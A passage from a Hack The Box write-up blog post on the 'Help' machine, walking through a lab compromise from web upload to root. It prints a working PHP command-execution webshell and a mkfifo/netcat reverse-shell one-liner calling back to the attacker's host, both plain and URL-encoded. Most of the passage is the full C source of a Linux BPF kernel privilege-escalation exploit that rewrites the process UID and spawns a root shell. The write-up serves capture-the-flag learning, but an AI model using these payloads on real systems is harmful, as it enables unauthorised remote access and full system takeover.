<span class="keyword">print</span> <span class="string">"found!"</span></span><br><span class="line">        <span class="keyword">print</span> url</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Sorry, I did not find anything"</span></span><br></pre></td></tr></table></figure>
<p>I went to the settings and changed the timezone to the same timezone as mine :<br><img src="/images/hackthebox/help/16.png" alt=""><br>The <code>php</code> file I’m going to upload is <code>simple-backdoor.php</code> which can be found in <code>/usr/share/webshells/php/simple-backdoor.php</code> in <code>kali</code> : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Simple PHP backdoor by DK (http:<span class="comment">//michaeldaw.org) --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">        $cmd = ($_REQUEST[<span class="string">'cmd'</span>]);</span><br><span class="line">        system($cmd);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Usage: http:<span class="comment">//target.com/simple-backdoor.php?cmd=cat+/etc/passwd</span></span><br><span class="line"></span><br><span class="line">&lt;!--    http:<span class="comment">//michaeldaw.org   2006    --&gt;</span></span><br></pre></td></tr></table></figure>
<p>I submitted the ticket :<br><img src="/images/hackthebox/help/17.png" alt=""><br>Then I ran the exploit and it found the file immediately :<br><code>python exploit.py http://10.10.10.121/support/ rick.php</code><br><img src="/images/hackthebox/help/18.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;help.htb&#x2F;support&#x2F;uploads&#x2F;tickets&#x2F;11559b997fcb9a724cbc0e2a6a4b98a3.php</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/help/19.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;help.htb&#x2F;support&#x2F;uploads&#x2F;tickets&#x2F;11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/help/20.png" alt=""><br>It’s working, let’s get a reverse shell, I used this payload (url encoded) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;help.htb&#x2F;support&#x2F;uploads&#x2F;tickets&#x2F;11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd&#x3D;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/help/21.png" alt=""><br><img src="/images/hackthebox/help/22.png" alt=""><br>We owned user.</p>
<h2 id="Kernel-Exploit-Privilege-Escalation-and-Root-Flag"><a href="#Kernel-Exploit-Privilege-Escalation-and-Root-Flag" class="headerlink" title="Kernel Exploit, Privilege Escalation and Root Flag"></a>Kernel Exploit, Privilege Escalation and Root Flag</h2><p>Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :<br><code>uname -a</code><br><img src="/images/hackthebox/help/23.png" alt=""><br>That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an <a href="https://www.exploit-db.com/exploits/44298" target="_blank" rel="noopener">exploit</a> published for it.<br><code>exploit.c</code> :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x5f8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog = 	<span class="string">"\xb4\x09\x00\x00\xff\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\x55\x09\x02\x00\xff\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x18\x19\x00\x00\x03\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x79\x06\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x79\x07\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x02\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x79\x08\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\x02\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x06\x03\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x79\x73\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x7b\x32\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x06\x02\x00\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x7b\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x7b\x87\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="function"><span class="params">		  <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="function"><span class="params">		  <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.prog_type = prog_type,</span><br><span class="line">		.insns = (__u64)insns,</span><br><span class="line">		.insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">		.license = (__u64)license,</span><br><span class="line">		.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">		.log_size = LOG_BUF_SIZE,</span><br><span class="line">		.log_level = <span class="number">1</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">	bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="function"><span class="params">		   <span class="keyword">int</span> max_entries)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_type = map_type,</span><br><span class="line">		.key_size = key_size,</span><br><span class="line">		.value_size = value_size,</span><br><span class="line">		.max_entries = max_entries</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)&amp;key,</span><br><span class="line">		.value = (__u64)&amp;value,</span><br><span class="line">		.flags = <span class="number">0</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)key,</span><br><span class="line">		.value = (__u64)value,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err) &#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"error: %s\n"</span>, err);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line">	<span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">			(struct bpf_insn *)__prog, PROGSIZE, <span class="string">"GPL"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">ssize_t</span> n = <span class="built_in">write</span>(sockets[<span class="number">0</span>], <span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"write"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>))</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"short write: %lu\n"</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line">	bpf_update_elem(<span class="number">0</span>, (a)); \</span><br><span class="line">	bpf_update_elem(<span class="number">1</span>, (b)); \</span><br><span class="line">	bpf_update_elem(<span class="number">2</span>, (c)); \</span><br><span class="line">	writemsg();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>) &#123;</span><br><span class="line">	__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr) &#123;</span><br><span class="line">	__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val) &#123;</span><br><span class="line">	__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">	fp = __get_fp();</span><br><span class="line">	<span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus fp"</span>);</span><br><span class="line">	</span><br><span class="line">	sp = get_sp(fp);</span><br><span class="line">	<span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus sp"</span>);</span><br><span class="line">	</span><br><span class="line">	task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus task ptr"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"task_struct = %lx\n"</span>, task_struct);</span><br><span class="line"></span><br><span class="line">	credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus cred ptr"</span>);</span><br><span class="line"></span><br><span class="line">	uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line">	<span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus uid ptr"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"uidptr = %lx\n"</span>, uidptr);</span><br><span class="line">	__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"spawning root shell\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/bash"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__exit(<span class="string">"not vulnerable?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	prep();</span><br><span class="line">	pwn();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>I ran a python server to host the exploit then I downloaded it on the box :<br><img src="/images/hackthebox/help/24.png" alt=""><br>Then I compiled the exploit and ran it :<br><code>gcc -o exploit exploit.c</code><br><img src="/images/hackthebox/help/25.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/sizzle/">Hack The Box - Sizzle</a><br>Next Hack The Box write-up : <a href="/hack-the-box/flujab/">Hack The Box - FluJab</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-06-08</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/code-analysis/" rel="tag">#code-analysis</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
